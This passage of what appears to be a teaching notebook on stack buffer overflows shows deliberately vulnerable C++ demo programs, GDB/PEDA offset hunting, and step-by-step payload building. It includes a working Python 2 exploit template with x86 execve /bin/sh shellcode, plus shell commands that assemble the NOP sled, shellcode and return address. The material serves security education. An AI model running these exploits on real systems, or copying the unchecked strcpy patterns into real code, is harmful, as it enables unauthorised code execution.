    "$ run $(python3 -c 'print(\"A\"*20, end=\"\")')\n",
    "$ next i\n",
    "$ x/s password_buffer\n",
    "$ x/x &auth_flag\n",
    "$ p/a &password_buffer\n",
    "$ p/d auth_flag\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### variables declaration order changed\n",
    "- can you overflow if the variable declaration orders are switched?\n",
    "- normally, variables are pushed on the stack as they're loaded from top to bottom\n",
    "    - the last variable decalred will be pushed last on the top of the stack\n",
    "- compile and examine booksrc/auth_overflow2.cpp\n",
    "- draw stack\n",
    "- verify it using GDB"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 184,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# copy booksrc/auth_overflow2.cpp\n",
    "! cp ./booksrc/auth_overflow2.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 185,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int check_authentication(char *password) {\r\n",
      "    char password_buffer[16];\r\n",
      "    int auth_flag = 0;\r\n",
      "\r\n",
      "\tstrcpy(password_buffer, password);\r\n",
      "\t\r\n",
      "\tif(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "\t\tauth_flag = 1;\r\n",
      "\tif(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "\t\tauth_flag = 1;\r\n",
      "\r\n",
      "\treturn auth_flag;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tif(argc < 2) {\r\n",
      "\t\tcout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "\t\texit(0);\r\n",
      "\t}\r\n",
      "\tif(check_authentication(argv[1])) {\r\n",
      "\t\tcout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "\t\tcout << \"      Access Granted.\\n\";\r\n",
      "\t\tcout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "\t} else {\r\n",
      "\t\tcout << \"\\nAccess Denied.\\n\";\r\n",
      "   }\r\n",
      "   return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "# let's see the source code of booksrc/auth_overflow2.c\n",
    "! cat auth_overflow2.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 186,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile the program\n",
    "! ./compile.sh booksrc/auth_overflow2.cpp auth_overflow2.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 187,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# run the program with 17As\n",
    "! ./auth_overflow2.exe $(python3 -c 'print(\"A\"*17, end=\"\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### well, how is it possible?\n",
    "- see in gdb where auth_flag is compared to password_buffer\n",
    "- turns out auth_flag is still at higher address (pushed before) compared to password_buffer\n",
    "- compiler optimization? (I don't have clear answer to why!)\n",
    "- if auth_flag is in lower address compared to password_buffer, you can't overwrite it by oveflowing password_buffer\n",
    "    - see Hacking textbook explanation\n",
    "\n",
    "### control return to the right block to authenticate  \n",
    "- overflow the return address to bypass check_authentication() condition in main and directly execute the true block\n",
    "- possible in older gcc/assembly version (Hacking LiveCD)\n",
    "- couldn't get it to work on newer system (tested on Kali (4-19-0)!\n",
    "- let's assemble and look at the return instruction...\n",
    "- repeated instructions add esp, 0x10 and sub esp, 0xc makes it hard to jump into the right instruction\n",
    "\n",
    "### can return to \"    access granted     \" line\n",
    "- find the address add esp, 0x10 before the addres to \"access granted\"\n",
    "- use that address to overwrite the return address with\n",
    "- find the offset from password_buffer to return address (32 bytes)\n",
    "    - subtract the the address of password_buffer from the address of return address\n",
    "    - or use gdb peda\n",
    "    \n",
    "```bash\n",
    "$ pattern arg 100 # create a pattern of 100 and set as the argument\n",
    "$ run\n",
    "    - run the program until segfault\n",
    "$ patts\n",
    "    - see EIP offset which is the return address\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. Remote code execution\n",
    "- inject and execute shellcode\n",
    "- shellcode is a program that gives you shell/terminal on the system\n",
    "- we'll use a vulnerable program booksrc/stack_overflow_demo.cpp\n",
    "- let's look at an example program that spawns shell/terminal on the system by calling system call\n",
    "    - copy, compile and run booksrc/system_shell.cpp program with /bin/sh argument\n",
    "\n",
    "### Example of code that spawns shell/terminal\n",
    "- high-level code example, using system API"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 192,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/system_shell.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 193,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdlib>\r\n",
      "#include <iostream>\r\n",
      "#include <cstring>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int main(int argc, char* argv[]) {\r\n",
      "    char buffer[100];\r\n",
      "    strcpy(buffer, argv[1]);\r\n",
      "    system(buffer);\r\n",
      "    cout << \"Good bye!\";\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat system_shell.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 194,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh system_shell.cpp system_shell.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run system_shell.exe from terminal\n",
    "    - Jupyter notebook doesn't give shell/terminal\n",
    "    \n",
    "- shellcode:\n",
    "    - typically is not bash command\n",
    "    - is executable binary when executed gives shell/terminal\n",
    "    - if stored in stack as a part of buffer, stack must be Executable!\n",
    "        - so the buffer can be treated as executable code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 195,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp booksrc/stack_overflow_demo.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 196,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void bad() {\r\n",
      "    char buffer[100];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    cout << \"Enter some text: \";\r\n",
      "    cin >> buffer;\r\n",
      "    cout << \"buffer contains: \\n\" << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\" << endl;\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "# let's look at the source\n",
    "# program simply copies and prints the user provided argument\n",
    "! cat stack_overflow_demo.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 197,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile and execute the program\n",
    "! ./compile.sh stack_overflow_demo.cpp stack_overflow_demo.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 202,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python3 -c 'print(\"A\"*100, end=\"\")' | ./stack_overflow_demo.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 203,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "/bin/bash: line 1: 44141 Done                    python3 -c 'print(\"A\"*200, end=\"\")'\r\n",
      "     44142 Segmentation fault      | ./stack_overflow_demo.exe\r\n"
     ]
    }
   ],
   "source": [
    "# provide a longer argument and see if the program segfaults\n",
    "! python3 -c 'print(\"A\"*200, end=\"\")' | ./stack_overflow_demo.exe\n",
    "# Notice \"Good bye!\"\" is not printed!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### stackoverflow exploitation\n",
    "#### code execution\n",
    "- create a payload\n",
    "- payload typically has the following structure:\n",
    "\n",
    "```bash\n",
    "| repeated nop sled | shellcode | repeated return address |\n",
    "```\n",
    "\n",
    "### nop sled\n",
    "- \\x90 - no operation instruction in assembly\n",
    "- if the buffer is large enough, use good number of NOP as a bigger cushion/wider landing zone\n",
    "- as the stack may shift a bit, it's harder to land exactly where the shellcode is\n",
    "- NOP let's you slide right to your shellcode that spawns a shell/terminal\n",
    "- you still need to pad the controlled buffer to make it long enough to overwrite the caller's return address\n",
    "    \n",
    "### shellcode\n",
    "- binary code that actually exploits the vulnerability\n",
    "- typically spawns, local or remote, tcp connect, reverse connect shell/terminal\n",
    "- let's you own the system by giving you access to the terminal\n",
    "  \n",
    "### repeated return address\n",
    "- address pointing to some address of repeated nop sled  where it is stored in buffer variable\n",
    "- this controlled return address should overwrite the caller's return address on stack\n",
    "\n",
    "### exploit code\n",
    "- code/program that delivers payload is called exploit code\n",
    "- provide the exploit code directly to the vulnerable program as an argument\n",
    "- you can create a exploitcode in Bash, Python, C/C++ to send the payload to the vulnerable program\n",
    "\n",
    "### 3 example exploit programs\n",
    "- Bash exploit code is in booksrc/exploit_stackoverflow.sh\n",
    "- C++ exploit code is in booksrc/exploit_stackoverflow.cpp\n",
    "- Python2 exploit code is in booksrc/exploit_stackoverflow2.py\n",
    "    - for now simply use provided exploit code; later learn how to generate the Python 2 template exploit code using PEDA"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 206,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2dc\r\n",
      "Enter some text: buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "/bin/bash: line 1: 44411 Done                    python3 -c 'print(\"A\"*200, end=\"\")'\r\n",
      "     44412 Segmentation fault      | ./stack_overflow_demo.exe\r\n"
     ]
    }
   ],
   "source": [
    "# directly providing a simple payload to the vulnerable program using bash as seen above\n",
    "! python3 -c 'print(\"A\"*200, end=\"\")' | ./stack_overflow_demo.exe\n",
    "# makes the program crash, so 200As is the payload!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 205,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "cp: cannot stat 'booksrc/exploit_stackoverflow.sh': No such file or directory\n",
      "cat: exploit_stackoverflow.sh: No such file or directory\n"
     ]
    },
    {
     "ename": "CalledProcessError",
     "evalue": "Command 'b\"# let's look at the bash exploit code\\n# note, certain values such as return address will be different in different system\\n# return must be updated if necessary!\\ncp booksrc/exploit_stackoverflow.sh .\\ncat exploit_stackoverflow.sh\\n\"' returned non-zero exit status 1.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mCalledProcessError\u001b[0m                        Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-205-2133d722a599>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun_cell_magic\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'bash'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m''\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"# let's look at the bash exploit code\\n# note, certain values such as return address will be different in different system\\n# return must be updated if necessary!\\ncp booksrc/exploit_stackoverflow.sh .\\ncat exploit_stackoverflow.sh\\n\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m~/miniconda3/lib/python3.8/site-packages/IPython/core/interactiveshell.py\u001b[0m in \u001b[0;36mrun_cell_magic\u001b[0;34m(self, magic_name, line, cell)\u001b[0m\n\u001b[1;32m   2369\u001b[0m             \u001b[0;32mwith\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuiltin_trap\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2370\u001b[0m                 \u001b[0margs\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0mmagic_arg_s\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2371\u001b[0;31m                 \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2372\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2373\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.8/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m<decorator-gen-110>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.8/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.8/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b\"# let's look at the bash exploit code\\n# note, certain values such as return address will be different in different system\\n# return must be updated if necessary!\\ncp booksrc/exploit_stackoverflow.sh .\\ncat exploit_stackoverflow.sh\\n\"' returned non-zero exit status 1."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# let's look at the bash exploit code\n",
    "# note, certain values such as return address will be different in different system\n",
    "# return must be updated if necessary!\n",
    "cp booksrc/exploit_stackoverflow.sh .\n",
    "cat exploit_stackoverflow.sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 204,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/usr/bin/env python2\n",
      "#\n",
      "# Template for local argv exploit code, generated by PEDA\n",
      "#\n",
      "import os\n",
      "import sys\n",
      "import struct\n",
      "import resource\n",
      "import time\n",
      "\n",
      "def usage():\n",
      "    print \"Usage: %s target_program\" % sys.argv[0]\n",
      "    return\n",
      "\n",
      "def pattern(size=1024, start=0):\n",
      "    try:\n",
      "        bytes = open(\"pattern.txt\").read(size+start)\n",
      "        return bytes[start:]\n",
      "    except:\n",
      "        return \"A\"*size\n",
      "\n",
      "def nops(size=1024):\n",
      "    return \"\\x90\"*size\n",
      "\n",
      "def int2hexstr(num, intsize=4):\n",
      "    if intsize == 8:\n",
      "        if num < 0:\n",
      "            result = struct.pack(\"<q\", num)\n",
      "        else:\n",
      "            result = struct.pack(\"<Q\", num)\n",
      "    else:\n",
      "        if num < 0:\n",
      "            result = struct.pack(\"<l\", num)\n",
      "        else:\n",
      "            result = struct.pack(\"<L\", num)\n",
      "    return result\n",
      "\n",
      "i2hs = int2hexstr\n",
      "\n",
      "def list2hexstr(intlist, intsize=4):\n",
      "    result = \"\"\n",
      "    for value in intlist:\n",
      "        if isinstance(value, str):\n",
      "            result += value\n",
      "        else:\n",
      "            result += int2hexstr(value, intsize)\n",
      "    return result\n",
      "\n",
      "l2hs = list2hexstr\n",
      "\n",
      "def exploit(vuln):\n",
      "    # x86/linux/exec: 24 bytes\n",
      "    shellcode = (\n",
      "    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\"\n",
      "    \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"\n",
      "    )\n",
      "    # nop sled\n",
      "    # calcualate the size of nop sled\n",
      "    # offset to return address (ebp+4) - len(exploit code) - (return addresses)\n",
      "    padding = nops(48) #72-24 or 76-24-4\n",
      "    payload = [padding]\n",
      "    # shellcode\n",
      "    payload += shellcode # put your payload here\n",
      "    # repeated return address\n",
      "    # change this value by finding the base address of buffer\n",
      "    # or some address of where nop instructions will be\n",
      "    # make sure to run the program with the actual exploit length\n",
      "    # when getting the base address of buffer\n",
      "    payload += \"\\x60\\xf1\\xff\\xbf\"\n",
      "    payload = list2hexstr(payload)\n",
      "    args = [vuln, payload]\n",
      "    env = {\"PEDA\":nops()}\n",
      "    resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))\n",
      "    resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))\n",
      "    os.execve(vuln, args, env)\n",
      "\n",
      "if __name__ == \"__main__\":\n",
      "    if len(sys.argv) < 2:\n",
      "        usage()\n",
      "    else:\n",
      "        exploit(sys.argv[1])\n",
      "    "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "#  let's look at the exploit code written in Python 2\n",
    "cp booksrc/exploit_stackoverflow.py .\n",
    "cat exploit_stackoverflow.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Modify caller's return address\n",
    "1. find where the caller's return address is stored on stack\n",
    "2. find the address of the exploit code that'll be loaded on the stack/buffer\n",
    "3. modify the return address with the address of the exploit code\n",
    "4. find the offset that will overwrite the value of the caller's return address\n",
    "- two ways:\n",
    "    1. use gdb\n",
    "    ```bash\n",
    "    gdb -q stack_overflow_demo.exe\n",
    "    break bad\n",
    "    run AAAA\n",
    "    print $ebp+4\n",
    "    print &buffer\n",
    "    print [address of $ebp+4 - &buffer] # note must use hex addresses\n",
    "    # gives you the offset required to overwrite the caller's return address\n",
    "    ```\n",
    "   \n",
    "    2. use peda pattern search technique as described below"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### how was the exploit_stackoverflow.py generated?\n",
    "\n",
    "### using GDB-PEDA\n",
    "- create pattern and use as an agrument to the program\n",
    "- crash the vulnerable program and run pattern search or patts to find offset of return address\n",
    "    - gdb -q ./stack_overflow_demo.exe\n",
    "    - pattern arg 200\n",
    "    - run \n",
    "    - after program crashes run\n",
    "    - patts or pattern search\n",
    "    - look for EIP+0 or EBP+0 offset + 4\n",
    "        - `EIP+0 found at offset: 76` \n",
    "        - that's the total offset required to overwrite the caller's return address \n",
    "        \n",
    "#### generate skeleton exploit code using GDB-PEDA\n",
    "    ```bash\n",
    "    skeleton argv exploit_stackoverflow.py\n",
    "    ```\n",
    "    \n",
    "#### create local linux shellcode \n",
    "    ```bash\n",
    "    shellcode generate x86/linux exec\n",
    "    ```\n",
    "- write the generated shellcode to a file\n",
    "- copy line by line hex values between \" \" and append it to a binary file\n",
    "\n",
    "```bash\n",
    "echo -ne \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\" > shellcode.bin\n",
    "echo -ne \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\" >> shellcode.bin\n",
    "```\n",
    "\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|\r\n",
      "00000018\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C shellcode.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using bash to exploit stack_overflow_demo.exe\n",
    "1. create the payload\n",
    "2. send payload to the vulnerabale program\n",
    "\n",
    "#### create payload\n",
    "- let's say 76 is the total offset\n",
    "- now, let's create payload buffer with shellcode\n",
    "    - 48 bytes nop sleds + shellcode (24 bytes) + return address (4 bytes)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "48\n"
     ]
    }
   ],
   "source": [
    "# how did we find the size of the nop sled?\n",
    "print(76-(24+4))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's create the payload of 76 bytes long, e.g.\n",
    "! perl -e 'print \"\\x90\"x48' > payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat shellcode.bin >> payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is at 0xffffc2a0\r\n"
     ]
    }
   ],
   "source": [
    "! ./stack_overflow_demo.exe $(python3 -c 'print(\"A\"*76, end=\"\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ffffc2b4"
     ]
    }
   ],
   "source": [
    "# find 20 bytes away from the base address of the buffer\n",
    "! printf \"%x\" $((0xffffc2a0+20))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {},
   "outputs": [],
   "source": [
    "! perl -e 'print \"\\xb4\\xc2\\xff\\xff\"' >> payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "76 payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
